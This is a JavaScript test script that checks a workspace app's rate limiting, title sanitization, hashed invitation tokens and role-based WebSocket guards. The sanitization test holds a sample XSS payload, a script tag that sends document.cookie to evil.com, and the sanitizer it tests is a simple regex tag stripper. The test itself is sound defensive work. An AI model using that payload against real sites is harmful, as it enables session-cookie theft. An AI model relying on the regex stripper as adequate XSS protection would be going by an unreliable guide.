import { PrismaClient } from '@prisma/client';
import crypto from 'crypto';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';
import { execSync } from 'child_process';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
dotenv.config({ path: path.resolve(__dirname, '../.env') });

// Auto-start local PostgreSQL if stopped
try {
  const statusOut = execSync('powershell -ExecutionPolicy Bypass -File scripts/local-pg.ps1 -Action status', { encoding: 'utf-8' });
  if (statusOut.includes('STOPPED')) {
    console.log('[Verify-Phase8] Starting local PostgreSQL...');
    execSync('powershell -ExecutionPolicy Bypass -File scripts/local-pg.ps1 -Action start', { stdio: 'inherit' });
  }
} catch {
  // Ignore
}

const prisma = new PrismaClient();

const assert = (cond, msg) => {
  if (!cond) throw new Error('ASSERTION FAILED: ' + msg);
};

// Helper functions for testing rate limiting and sanitization
function checkRateLimitInMemory(store, key, limit, windowMs) {
  const now = Date.now();
  let record = store.get(key);
  if (!record) {
    record = { timestamps: [] };
    store.set(key, record);
  }
  record.timestamps = record.timestamps.filter((ts) => now - ts < windowMs);
  if (record.timestamps.length >= limit) {
    const oldest = record.timestamps[0];
    const retryAfter = Math.max(1, Math.ceil((oldest + windowMs - now) / 1000));
    return { success: false, limit, remaining: 0, retryAfter };
  }
  record.timestamps.push(now);
  return { success: true, limit, remaining: limit - record.timestamps.length, retryAfter: 0 };
}

function stripHtml(str) {
  if (!str) return '';
  return str.replace(/<[^>]*>?/gm, '').replace(/[\u0000-\u0008\u000B-\u000C\u000E-\u001F\u007F]/g, '').trim();
}

function sanitizeTitle(title, max = 120, fallback = 'Untitled') {
  if (!title) return fallback;
  const stripped = stripHtml(title);
  return (stripped || fallback).slice(0, max);
}

function hashToken(token) {
  return crypto.createHash('sha256').update(token).digest('hex');
}

async function verifyPhase8() {
  console.log('--- Starting Phase 8: Permissions, Security & Rate Limiting Verification ---');

  // ==========================================
  // 1. Rate Limiting Verification
  // ==========================================
  console.log('\n[1/5] Verifying Rate Limiting Algorithm...');
  const testStore = new Map();
  const testIp = '203.0.113.42';

  const r1 = checkRateLimitInMemory(testStore, testIp, 3, 400);
  const r2 = checkRateLimitInMemory(testStore, testIp, 3, 400);
  const r3 = checkRateLimitInMemory(testStore, testIp, 3, 400);
  assert(r1.success && r2.success && r3.success, 'First 3 requests must succeed');
  assert(r3.remaining === 0, 'Remaining count must reach 0');

  const r4 = checkRateLimitInMemory(testStore, testIp, 3, 400);
  assert(!r4.success, '4th request must be blocked');
  assert(r4.retryAfter > 0, 'Blocked request must provide retry-after seconds');
  console.log('  ✓ Rate limiter properly throttled burst requests (429 blocked)');

  // Sleep 450ms for window to slide
  await new Promise((res) => setTimeout(res, 450));
  const r5 = checkRateLimitInMemory(testStore, testIp, 3, 400);
  assert(r5.success, 'Request after sliding window expiry must succeed');
  console.log('  ✓ Rate limiter sliding window automatically recovers');

  // ==========================================
  // 2. Input Sanitization & XSS Protection
  // ==========================================
  console.log('\n[2/5] Verifying Input Sanitization...');
  const attackPayload = '<script>fetch("http://evil.com/cookie?c=" + document.cookie)</script>Important Meeting Notes';
  const cleanTitle = sanitizeTitle(attackPayload);
  assert(!cleanTitle.includes('<script>'), 'Title must not contain script tags');
  assert(cleanTitle.includes('Important Meeting Notes'), 'Clean text must be preserved');

  const emptyTitle = sanitizeTitle('   <b></b>   ');
  assert(emptyTitle === 'Untitled', 'Empty or all-tag title must fall back to Untitled');

  const hugeString = 'X'.repeat(500);
  assert(sanitizeTitle(hugeString, 50).length === 50, 'Title must be strictly truncated to maxLength');
  console.log('  ✓ HTML stripping, XSS neutralization, and length capping verified');

  // ==========================================
  // 3. Workspace Invitations Lifecycle
  // ==========================================
  console.log('\n[3/5] Verifying Cryptographic Workspace Invitations...');
  const testSuffix = Date.now().toString().slice(-6);

  const alice = await prisma.user.create({
    data: {
      email: `alice_sec_${testSuffix}@example.com`,
      name: 'Alice SecAdmin',
      passwordHash: '$2a$10$abcdefghijklmnopqrstuvwxyz123456',
    },
  });

  const bob = await prisma.user.create({
    data: {
      email: `bob_sec_${testSuffix}@example.com`,
      name: 'Bob SecUser',
      passwordHash: '$2a$10$abcdefghijklmnopqrstuvwxyz123456',
    },
  });

  const workspace = await prisma.workspace.create({
    data: {
      name: `Security Workspace ${testSuffix}`,
      ownerId: alice.id,
      members: {
        create: {
          userId: alice.id,
          role: 'OWNER',
        },
      },
    },
  });

  // Generate invitation token
  const rawToken = crypto.randomBytes(32).toString('hex');
  const tokenHash = hashToken(rawToken);
  const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7 days

  const inviteRecord = await prisma.invitation.create({
    data: {
      workspaceId: workspace.id,
      email: bob.email,
      role: 'EDITOR',
      tokenHash,
      inviterId: alice.id,
      expiresAt,
    },
  });

  assert(inviteRecord.id, 'Invitation record must be created');
  assert(inviteRecord.tokenHash === tokenHash, 'Stored token must be SHA-256 hashed');
  console.log(`  ✓ Created 7-day secure invitation for ${bob.email} (Role: EDITOR)`);

  // Verify preview lookup by raw token
  const foundInvite = await prisma.invitation.findUnique({
    where: { tokenHash: hashToken(rawToken) },
    include: { workspace: true, inviter: true },
  });
  assert(foundInvite && foundInvite.workspace.id === workspace.id, 'Token lookup must resolve workspace');
  assert(foundInvite.expiresAt.getTime() > Date.now(), 'Token must be recognized as active');
  console.log('  ✓ Token preview lookup resolved correct workspace & inviter');

  // Bob accepts the invitation
  await prisma.workspaceMember.create({
    data: {
      workspaceId: foundInvite.workspaceId,
      userId: bob.id,
      role: foundInvite.role,
    },
  });

  await prisma.invitation.delete({
    where: { id: foundInvite.id },
  });

  // Verify Bob is now an active member
  const bobMembership = await prisma.workspaceMember.findUnique({
    where: {
      workspaceId_userId: {
        workspaceId: workspace.id,
        userId: bob.id,
      },
    },
  });
  assert(bobMembership && bobMembership.role === 'EDITOR', 'Bob must now be active workspace member as EDITOR');

  // Verify invitation is consumed and no longer exists
  const consumed = await prisma.invitation.findUnique({
    where: { tokenHash },
  });
  assert(!consumed, 'Consumed invitation must be deleted after acceptance');
  console.log('  ✓ Invitation acceptance successfully granted workspace membership and purged single-use token');

  // ==========================================
  // 4. Expired Invitation Rejection
  // ==========================================
  console.log('\n[4/5] Verifying Expired Invitation Handling...');
  const expiredRawToken = crypto.randomBytes(32).toString('hex');
  const expiredTokenHash = hashToken(expiredRawToken);

  const expiredInvite = await prisma.invitation.create({
    data: {
      workspaceId: workspace.id,
      email: `expired_${testSuffix}@example.com`,
      role: 'VIEWER',
      tokenHash: expiredTokenHash,
      inviterId: alice.id,
      expiresAt: new Date(Date.now() - 3600 * 1000), // 1 hour in the past
    },
  });

  const isExpired = expiredInvite.expiresAt.getTime() < Date.now();
  assert(isExpired, 'Timestamp in the past must be detected as expired');
  console.log('  ✓ Expired invitation detected and flagged correctly');

  // ==========================================
  // 5. Server-Side WebSocket RBAC Guards
  // ==========================================
  console.log('\n[5/5] Verifying WebSocket Server-Side RBAC Guards...');
  const viewerUser = { name: 'Dave Viewer', role: 'VIEWER' };
  const editorUser = { name: 'Bob Editor', role: 'EDITOR' };

  // Test mutation guard logic
  function canEmitYjsUpdate(role) {
    return role === 'OWNER' || role === 'EDITOR';
  }

  assert(!canEmitYjsUpdate(viewerUser.role), 'VIEWER role must be prohibited from dispatching Yjs updates');
  assert(!canEmitYjsUpdate('COMMENTER'), 'COMMENTER role must be prohibited from dispatching Yjs updates');
  assert(canEmitYjsUpdate(editorUser.role), 'EDITOR role must be permitted to dispatch Yjs updates');
  assert(canEmitYjsUpdate('OWNER'), 'OWNER role must be permitted to dispatch Yjs updates');
  console.log('  ✓ Read-only roles (VIEWER, COMMENTER) strictly blocked from WebSocket mutation dispatch');

  // Clean up test data
  await prisma.workspace.delete({ where: { id: workspace.id } });
  await prisma.user.deleteMany({
    where: { id: { in: [alice.id, bob.id] } },
  });

  console.log('\n=============================================================');
  console.log('🎉 ALL PHASE 8 SECURITY, PERMISSION & RATE LIMIT TESTS PASSED!');
  console.log('=============================================================');
}

verifyPhase8()
  .catch((err) => {
    console.error('\n❌ Verification Failed:', err);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
